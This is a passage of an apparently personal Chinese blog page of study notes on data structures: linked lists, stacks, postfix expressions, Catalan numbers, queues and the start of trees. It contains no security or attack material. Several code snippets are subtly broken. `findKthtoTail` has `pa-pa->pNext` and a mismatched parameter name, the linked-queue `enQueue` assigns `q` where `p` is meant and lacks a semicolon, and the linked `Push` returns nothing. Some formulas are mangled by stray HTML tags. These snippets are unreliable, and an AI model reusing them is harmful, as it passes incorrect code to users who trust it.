class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ListNode* <span class="title">findKthtoTail</span> <span class="params">(ListNode* P, <span class="type">unsigned</span> <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line"><span class="built_in">assert</span>(p != <span class="literal">NULL</span> &amp;&amp; k &gt;= <span class="number">1</span>);</span><br><span class="line">ListNode* pa=p, *pb=p;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i &lt; k<span class="number">-1</span>; ++i) &#123;</span><br><span class="line">        pa-pa-&gt;pNext;</span><br><span class="line">        <span class="keyword">if</span>(pa == <span class="literal">NULL</span>)</span><br><span class="line">   <span class="keyword">return</span> <span class="literal">NULL</span>;<span class="comment">// 当链表p的长度小于k的时候，返回NULL;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (pa-&gt;pNext != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    pa=pa-&gt;pNext;</span><br><span class="line">    pb=pb-&gt;pNext;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> pb;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>例2：&#x3D;&#x3D;<u>确定两个单向链表是否相交，若相交找出第一个公共结点</u>。&#x3D;&#x3D;</p><p>解答：首先利用快慢指针判断链表是否有环。</p><ol><li>如果都不存在环，则如果两个单向链表有公共的结点，也就是说两个链表<u>从某一结点开始，它们的后继结点指针都指向同一个结点。</u>但由于是单向链表的结点，每个结点只有一个next指针，因此从第一个公共结点开始，之后它们所有结点都是重合的，如下图所示。</li></ol><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220712095846069.png" alt="image-20220712095846069"></p><p>如何寻找相较的第一个结点：</p><p>首先两个链表各遍历一次，求出两个链表的长度L1、 L2, 然后可得出两个链表的长度差L。然后先在长的链表上遍历L个结点，之后再同步遍历，于是在遍历中，第一个相同的结点就是第一个公共的结点。此时，如果第一个链表的长度为m,第二个链表的长度为n，该方法的时间复杂度为O(m+n)。</p><ol start="2"><li><p>如果一个存在环，另一个不存在环，则这两个链表是不可能相交的；</p></li><li><p>如果利用快慢指针发现两个链表都存在环，则判断任意一个链表上快慢指针相遇的那个结点在不在另一条链表上（共环，末尾结点存在环中）。如果在，则相交，如果不在，则不相交。若相交，两个链表的入口点可能并不是环上同一个结点，则再利用本节的方法各自找出两个链表环的入口点，可以定义任一入口点为相交的第一个结点。</p></li></ol></blockquote></li></ul><h3 id="1-3-双链表"><a href="#1-3-双链表" class="headerlink" title="1.3 双链表"></a>1.3 双链表</h3><p>使得查找某个结点的前驱结点的时间复杂度从O(n)变为了O(1)。</p><ul><li><p><strong>双链表的插入操作</strong></p><p>在双链表中p所指结点之后插入结点s</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">s-&gt;next = p-&gt;next;    <span class="comment">// 将s结点插入p结点之后</span></span><br><span class="line">p-&gt;next-&gt;prior = s;</span><br><span class="line">s-&gt;prior = p;</span><br><span class="line">p-&gt;next = s;   <span class="comment">// 最后修改p-&gt;next</span></span><br></pre></td></tr></table></figure><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220712103056289.png" alt="image-20220712103056289"></p></li><li><p><strong>双链表的删除操作</strong></p><p>删除双链表中结点p的后继结点q</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p-&gt;next = q-&gt;next;</span><br><span class="line">q-&gt;next-&gt;prior = p;</span><br><span class="line">free(q);</span><br></pre></td></tr></table></figure></li></ul><h2 id="2-栈与队列"><a href="#2-栈与队列" class="headerlink" title="2 栈与队列"></a>2 栈与队列</h2><p>栈与队列同样是线性表，具有和线性表相同的逻辑结构，但是操作受限。</p><h3 id="2-1-栈（堆栈）"><a href="#2-1-栈（堆栈）" class="headerlink" title="2.1 栈（堆栈）"></a>2.1 栈（堆栈）</h3><p>栈，也叫堆栈，其限制是仅允许在表的一端进行插入和删除。人们把此端称为栈顶，栈顶的第一个元素被称为栈顶元素，相对地，把另一端称为栈底。向一个栈插入新元素又称为进栈或入栈（push），它是把该元素放到栈顶元素的上面，使之成为新的栈顶元素；从一个栈删除元素又称为出栈或退栈（pop），它是把栈顶元素删除掉，使其下面的相邻元素成为新的栈顶元素。</p><p>由于堆栈数据结构只允许在一端进行操作，因而按照<strong>后进先出</strong>（LIFO, Last In First Out）的原理运作。</p><h4 id="栈的顺序存储结构"><a href="#栈的顺序存储结构" class="headerlink" title="栈的顺序存储结构"></a>栈的顺序存储结构</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>&#123;</span><br><span class="line">    ElemType data[MaxSize];  <span class="comment">// 存放栈中的数据元素，下标范围为0 ~ MaxSize-1</span></span><br><span class="line">    <span class="type">int</span> top;                 <span class="comment">// 栈顶指针，存放栈顶元素在data数组中的下标</span></span><br><span class="line">&#125;SqStack；</span><br></pre></td></tr></table></figure><p><strong>栈空的条件</strong>：<code>s-&gt;top == -1</code>。</p><p><strong>栈满的条件</strong>：<code>s-&gt;top == MaxSize-1</code>。</p><p><strong>进栈</strong>：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">Push</span><span class="params">(SqStack * &amp;s, ElemType e)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(s-&gt;top == MaxSize<span class="number">-1</span>)  <span class="comment">// 栈已满</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    s-&gt;top++;   <span class="comment">// 入栈，栈顶指针加1</span></span><br><span class="line">    s-&gt;data[s-&gt;top] = e;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>出栈</strong>：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">Pop</span><span class="params">(SqStack * &amp;s, ElemType &amp;e)</span></span>&#123;  <span class="comment">// 注意e为引用</span></span><br><span class="line"><span class="keyword">if</span>(s-&gt;top == <span class="number">-1</span>)  <span class="comment">// 栈已空</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    e = s-&gt;data[s-&gt;top];  <span class="comment">// 取栈顶元素</span></span><br><span class="line">    s-&gt;top--;             <span class="comment">// 出栈，栈顶指针减1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>取栈顶元素</strong>：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">GetTop</span><span class="params">(SqStack * &amp;s, ElemType &amp;e)</span></span>&#123;  <span class="comment">// 注意e为引用</span></span><br><span class="line"><span class="keyword">if</span>(s-&gt;top == <span class="number">-1</span>)  <span class="comment">// 栈已空</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    e = s-&gt;data[s-&gt;top];  <span class="comment">// 取栈顶元素</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>销毁栈</strong>：free(s)。</p><hr><h4 id="栈的链式存储结构——链栈"><a href="#栈的链式存储结构——链栈" class="headerlink" title="栈的链式存储结构——链栈"></a>栈的链式存储结构——链栈</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">linknode</span>&#123;</span><br><span class="line">    ElemType data;             <span class="comment">// 存放栈中的数据元素</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">linknode</span> *next;     <span class="comment">// 指针域</span></span><br><span class="line">&#125;LinkStNode；</span><br></pre></td></tr></table></figure><p><strong>栈空的条件</strong>：<code>s-&gt;next == NULL</code>。</p><p><strong>栈满的条件</strong>：不考虑。</p><p><strong>进栈</strong>：插入<u>头节点</u>之后</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">Push</span><span class="params">(LinkStNode * &amp;s, ElemType e)</span></span>&#123;</span><br><span class="line">LinkStNode *p = <span class="keyword">new</span> <span class="built_in">LinkStNode</span>();</span><br><span class="line">    p-&gt;data = e;</span><br><span class="line">    p-&gt;next = s-&gt;next;   <span class="comment">// 入栈,插入头结点s之后，作为新的首结点</span></span><br><span class="line">    s-&gt;next = p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>出栈</strong>：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">Pop</span><span class="params">(LinkStNode * &amp;s, ElemType &amp;e)</span></span>&#123;  <span class="comment">// 注意e为引用</span></span><br><span class="line">    LinkStNode *p;</span><br><span class="line"><span class="keyword">if</span>(s-&gt;next == <span class="literal">NULL</span>)   <span class="comment">// 栈已空</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    p = s-&gt;next;          <span class="comment">// p指向首结点</span></span><br><span class="line">    e = p-&gt;data;          <span class="comment">// 提取首结点值</span></span><br><span class="line">    s-&gt;next = p-&gt;next;    <span class="comment">// 删除首结点</span></span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>取栈顶元素</strong>：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">GetTop</span><span class="params">(LinkStNode * &amp;s, ElemType &amp;e)</span></span>&#123;  <span class="comment">// 注意e为引用</span></span><br><span class="line"><span class="keyword">if</span>(s-&gt;next == <span class="literal">NULL</span>)   <span class="comment">// 栈已空</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    e = s-&gt;next-&gt;data;  <span class="comment">// 取栈顶元素</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-2-栈的应用"><a href="#2-2-栈的应用" class="headerlink" title="2.2 栈的应用"></a>2.2 栈的应用</h3><h4 id="中缀表达式和后缀表达式"><a href="#中缀表达式和后缀表达式" class="headerlink" title="中缀表达式和后缀表达式"></a>中缀表达式和后缀表达式</h4><p><strong>中缀表达式</strong>：运算符在数之间，如<code>A+B*(C-D)-E/F</code>，需要考虑运算符的出现顺序、优先级，以及括号的使用。</p><p><strong>后缀表达式</strong>（逆波兰式）：把运算符放在两个运算对象之后。不存在括号，也不存在优先级的差别，计算过程按照运算符出现的先后次序进行。比如<code>A+B*(C-D)-E/F</code>对应的后缀表达式为<code>ABCD-*+EF/-</code>。</p><p>&#x3D;&#x3D;中缀表达式转换为后缀表达式：&#x3D;&#x3D;</p><p><u><strong>方法一：使用两个栈实现</strong></u></p><p>要使用到2个栈，stack栈用来存放运算符，post栈用来存放最后的后缀表达式。</p><p>转换原则是：从左向右扫描中缀表达式，<u>若读到的是操作数，则直接存入post栈</u>；若读到的是运算符：</p><ol><li><p>该运算符为”(“，则直接存入stack栈；</p></li><li><p>该运算符为”)”，则将stack栈中第一个”(“前的所有运算符依次出栈，并依次存入post栈，但是”(“和”)”都不存入post栈；</p></li><li><p>若该运算符为非括号，则<u>将该运算符和stack栈顶运算符进行比较，若<strong>高于</strong>栈顶运算符，则直接存入stack栈，否则将栈顶运算符出栈，存入post栈</u>，然后继续与新的栈顶元素比较，直到该运算符能存入stack。（使得post中优先级高的运算符在前，或者说接近栈底）当扫描完后，stack栈中还有运算符时，则将所有的运算符出栈，存入post栈。</p></li></ol><p><code>A+B*(C-D)-E/F</code>转换为后缀表达式的过程如下：</p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220713095114567.png" alt="image-20220713095114567" style="zoom:20%;"><p><strong><u>方法二：使用语法树实现</u></strong></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220713095408275.png" alt="image-20220713095408275"></p><p><strong><u>方法三：加括号法</u></strong></p><ol><li>先按照运算符的优先级对中缀表达式加括号，变成<code>((a+(b*c))+(((d*e)+f)*g))</code></li><li>将运算符移到括号的后面，变成<code>((a(bc)*)+(((de)*f)+g)*)+</code></li><li>去掉括号，得到<code>abc*+de*f+g*+</code></li></ol><h4 id="后缀表达式的求值"><a href="#后缀表达式的求值" class="headerlink" title="后缀表达式的求值"></a>后缀表达式的求值</h4><p>通过后缀表示计算表达式值的过程为：<br>顺序扫描表达式的每一项，然后根据它的类型做如下相应操作：如果该项是操作数，则将其压入栈中；<u>如果该项是操作符&lt;op&gt;，则连续从栈中退出两个操作数Y和X，形成运算指令X&lt;op&gt;Y，并将计算结果重新压入栈中</u>。当表达式的所有项都扫描并处理完后，栈顶存放的就是最后的计算结果。</p><h3 id="2-3-Catalan数"><a href="#2-3-Catalan数" class="headerlink" title="2.3 Catalan数"></a>2.3 Catalan数</h3><p>卡特兰数（Catalan number）是<strong>组合数学</strong>中一个常出现在各种<strong>计数问题</strong>中的<strong>数列</strong>。</p><p>数列的前几项为：1, 1, 2, 5, 14, 42, 132, 429, 1430, 4862, …</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220713150425813.png" alt="image-20220713150425813"></p><p><strong>相关的经典问题：</strong></p><h4 id="进出栈序列"><a href="#进出栈序列" class="headerlink" title="进出栈序列"></a>进出栈序列</h4><blockquote><p>n个元素进栈序列为：1，2，3，4，…，n，则有多少种出栈序列？</p></blockquote><p>将进栈表示为 +1，出栈表示为 -1，根据栈本身的特点，每次出栈的时候，必定之前有元素入栈，即对于每个 -1 前面都有一个 +1 相对应。因此，出栈序列的 <strong>所有前缀和</strong> 必然大于等于 0，并且 +1 的数量 <strong>等于</strong> -1 的数量。</p><p>当出现某一前缀和小于0时（即出现前缀和等于-1的情况，-1的数量比+1多一个），该出栈序列就是非法的。假设+1和-1的数量均为n，将该前缀取反之后，就会变成+1的数量比-1多一个，即存在n+1个+1，n-1个-1。取反后的序列与之前的序列是一一对应的。因此，非法序列的数量有$C^{n+1}<em>{2n}$。因此，合法的出栈序列的数量为$\LARGE C^{n}</em>{2n}-C^{n+1}<em>{2n}&#x3D;\frac{C^{n}</em>{2n}}{n+1}$。此时我们就得到了卡特兰数的通项$\LARGE \frac{C^{n}_{2n}}{n+1}$。</p><h4 id="括号序列"><a href="#括号序列" class="headerlink" title="括号序列"></a>括号序列</h4><blockquote><p>n 对括号，则有多少种 “括号匹配” 的括号序列</p></blockquote><p>左括号看成 +1，右括号看成 -1，那么就和上题的进出栈一样，每次有右括号的时候，必定之前有左括号匹配，且序列的 <strong>所有前缀和</strong> 必然大于等于 0，并且 +1 的数量 <strong>等于</strong> -1 的数量。因此共有$\LARGE \frac{C^{n}_{2n}}{n+1}$种序列。</p><h4 id="二叉树"><a href="#二叉树" class="headerlink" title="二叉树"></a>二叉树</h4><blockquote><p><code>n + 1</code> 个叶子节点能够构成多少种形状不同的（国际）满二叉树（结点要么是叶子结点，要么它有两个子结点，且叶子节点均在最后一层）</p></blockquote><p>使用深度优先搜索这个满二叉树，向左扩展时标记为 +1，向右扩展时标记为 -1。</p><p>由于每个非叶子节点都有两个左右子节点，所有它必然会先向左扩展，再向右扩展。总体下来，左右扩展将会形成匹配，即变成进出栈的题型。<code>n + 1</code>个叶子结点会有 2n 次扩展，构成$\LARGE \frac{C^{n}_{2n}}{n+1}$种形状不同的满二叉树。</p><p><strong>基本上所有的卡特兰数问题经过一定的转换都可以还原成进出栈问题，其中都会存在一种匹配关系，如进出栈匹配，括号匹配等。</strong>一旦计数问题中存在这种关系，那我们就需要去考虑这是否是卡特兰数问题。此外，我们还可以记住序列前四项：<code>1, 1, 2, 5</code>，这些将有利于我们联想到卡特兰数。</p><p>例如，以下问题的题解均为卡特兰数：</p><p>有2n个人排成一行进入剧场。 入场费5元。其中只有n个人有一张5元钞票，另外n人只有10元钞票，剧院无其他钞票，问有多少种方法使得只要有10元的人买票，售票处就有5元的钞票找零? $\LARGE \frac{C^{n}<em>{2n}}{n+1}$种。<br>一位大城市的律师在她住所以北n个街区和以东n个街区处工作。每天她走2n个街区去上班。如果她从不穿越(但可以碰到)从家到办公室的对角线，那么有多少条可能的道路? $\LARGE \frac{C^{n}</em>{2n}}{n+1}$种。<br>在圆上选择2n个点，将这些点成对连接起来使得所得到的n条线段不相交的方法数? $\LARGE \frac{C^{n}<em>{2n}}{n+1}$种。<br>矩阵连乘：p&#x3D;$a_1$x$a_2$x…x$a_n$，依据乘法结合律，不改变其顺序，只用括号表示成对的乘积，试问有几种括号化的方案? $\LARGE \frac{C^{n}</em>{2n}}{n+1}$种。</p><h3 id="2-4-队列"><a href="#2-4-队列" class="headerlink" title="2.4 队列"></a>2.4 队列</h3><p>一种操作受限的线性表，<strong>仅允许在表的一端（队尾）进行插入操作（入队），而在表的另一端（队首）进行删除操作（出队）</strong>。因此，队列也叫做<strong>先进先出表</strong>。</p><h4 id="队列的顺序存储结构"><a href="#队列的顺序存储结构" class="headerlink" title="队列的顺序存储结构"></a>队列的顺序存储结构</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>&#123;</span><br><span class="line">ElemType data[MaxSize];   <span class="comment">// 队列中的元素</span></span><br><span class="line">    <span class="type">int</span> front, rear;          <span class="comment">// 队头指针和队尾指针，front、rear初始值-1</span></span><br><span class="line">&#125;SqQueue;</span><br></pre></td></tr></table></figure><p><strong>队空的条件</strong>：<code>q-&gt;front == q-&gt;rear</code>。</p><p><strong>队满的条件</strong>：<code>q-&gt;rear == MaxSize-1</code>。</p><p><strong>进队</strong>：<u>rear增1</u>，然后将元素e插入到该位置。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">enQueue</span><span class="params">(SqQueue *&amp;q, ElemType e)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(q-&gt;rear == MaxSize<span class="number">-1</span>)   <span class="comment">// 队满</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    q-&gt;rear++;           <span class="comment">// 队尾增1</span></span><br><span class="line">    q-&gt;data[q-&gt;rear] = e;   <span class="comment">// 队尾插入元素e</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>出队</strong>：<u>front增1</u>，然后将该位置的元素赋给e。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">deQueue</span><span class="params">(SqQueue *&amp;q, ElemType &amp;e)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(q-&gt;front == q-&gt;rear)   <span class="comment">// 队空</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    q-&gt;front++;</span><br><span class="line">    e = q-&gt;data[q-&gt;front];</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>队列的元素个数：<code>rear-front</code>。</p><p>进队时rear增1，出队时front增1，这样整个队列会在数组中慢慢向右移动，容易出现假溢出的情况。</p><hr><h4 id="环形队列"><a href="#环形队列" class="headerlink" title="环形队列"></a>环形队列</h4><p>按照<code>q-&gt;rear == MaxSize-1</code>的队满条件判断时，可能存在假溢出的情况，另一端仍然存在空位置。解决的办法是把data数组的前后端连接在一起，形成环形队列（循环队列）。<strong>用数组实现队列的话，循环队列一般是必需的。</strong></p><p>环形队列的队空条件：<code>q-&gt;front == q-&gt;rear</code>。</p><p>环形队列的队满条件：<code>(q-&gt;rear+1) % MaxSize == q-&gt;front</code>。</p><p><strong>环形队列的进队</strong>：rear增1，然后将元素e插入到该位置。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">enQueue</span><span class="params">(SqQueue *&amp;q, ElemType e)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>((q-&gt;rear+<span class="number">1</span>) % MaxSize == q-&gt;front)   <span class="comment">// 队满</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    q-&gt;rear = (q-&gt;rear+<span class="number">1</span>) % MaxSize; <span class="comment">// 队尾增1，注意：环形队列的rear指针是循环增1，也就是还要对MaxSize取余</span></span><br><span class="line">    q-&gt;data[q-&gt;rear] = e;            <span class="comment">// 队尾插入元素e</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>环形队列的出队</strong>：front增1，然后将该位置的元素赋给e。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">deQueue</span><span class="params">(SqQueue *&amp;q, ElemType &amp;e)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(q-&gt;front == q-&gt;rear)   <span class="comment">// 队空</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    q-&gt;front = (q-&gt;front+<span class="number">1</span>) % MaxSize; <span class="comment">// 队头增1，注意：环形队列的front指针是循环增1，也就是还要对MaxSize取余</span></span><br><span class="line">    e = q-&gt;data[q-&gt;front];</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>环形队列的元素个数</strong>：<code>(rear-front+MaxSize) % MaxSize</code>。</p><hr><h4 id="队列的链式存储结构——链队"><a href="#队列的链式存储结构——链队" class="headerlink" title="队列的链式存储结构——链队"></a>队列的链式存储结构——链队</h4><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220713162757790.png" alt="image-20220713162757790" style="zoom:20%;"><p>链队中的<u>数据结点类型</u>DataNode的声明如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">qnode</span>&#123;</span><br><span class="line">ElemType data;            <span class="comment">// 存放元素</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">qnode</span> *next;       <span class="comment">// 下一个结点指针</span></span><br><span class="line">&#125;DataNode;</span><br></pre></td></tr></table></figure><p>链队<u>头结点类型</u>LinkQuNode的声明如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">typedef struct&#123;</span><br><span class="line">DataNode *front;      // 指向队首结点</span><br><span class="line">    DataNode *rear;       // 指向队尾结点</span><br><span class="line">&#125;LinkQuNode;</span><br></pre></td></tr></table></figure><p><strong>队空的条件</strong>：<code>q-&gt;front == NULL</code>或者<code>q-&gt;rear == NULL</code>。</p><p><strong>队满的条件</strong>：不考虑。</p><p><strong>进队</strong>：新建结点存放元素e（由p指向它），将结点p插入作为尾结点。要注意原来队列为空的情况。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">enQueue</span><span class="params">(LinkQuNode *&amp;q, ElemType e)</span></span>&#123;</span><br><span class="line">    DataNode *p = <span class="keyword">new</span> <span class="built_in">DataNode</span>();</span><br><span class="line">    p-&gt;data = e;</span><br><span class="line">    p-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span>(q-&gt;rear==<span class="literal">NULL</span>)  <span class="comment">// 队列为空，front和rear将都指向新增的结点p</span></span><br><span class="line">        q-&gt;front=q-&gt;rear=q;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        q-&gt;rear-&gt;next = p   <span class="comment">// 队尾插入元素e</span></span><br><span class="line">        q-&gt;rear = p;        <span class="comment">// 更新队尾指针</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>出队</strong>：取出队首结点的data值并将其删除。要注意原来的队列仅有一个数据结点的情况。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">deQueue</span><span class="params">(LinkQuNode *&amp;q, ElemType &amp;e)</span></span>&#123;</span><br><span class="line">    DataNode *t;          <span class="comment">// 用于暂存队首结点</span></span><br><span class="line">    <span class="keyword">if</span>(q-&gt;rear == <span class="literal">NULL</span>)   <span class="comment">// 队空</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    t = q-&gt;front;         <span class="comment">// 取队首结点</span></span><br><span class="line">    <span class="keyword">if</span>(q-&gt;front == q-&gt;rear)   <span class="comment">// 原来的队列仅有一个数据结点</span></span><br><span class="line">        q-&gt;front=q-&gt;rear=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        q-&gt;front = q-&gt;front-&gt;next;</span><br><span class="line">    e = t-&gt;data;</span><br><span class="line">    <span class="built_in">free</span>(t);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-树"><a href="#3-树" class="headerlink" title="3 树"></a>3 树</h2><h3 id="3-1-树的基本概念和性质"><a href="#3-1-树的基本概念和性质" class="headerlink" title="3.1 树的基本概念和性质"></a>3.1 树的基本概念和性质</h3><h4 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h4><p>树是N (N&gt;&#x3D;0)个结点的有限集。当N&#x3D;0时， 树为空树。N&gt;0时，有且仅有一个结点作为树的 <strong>根节点</strong>。</p><p>树中一个结点的子结点个数称为该 <strong>结点的度</strong> ，树中结点的最大度数称为 <strong>树的度</strong>。通常将度为m的树成为 <strong>m次树</strong>。</p><p>度不为0的结点称为 <strong>分支结点</strong>，度为0的结点称为 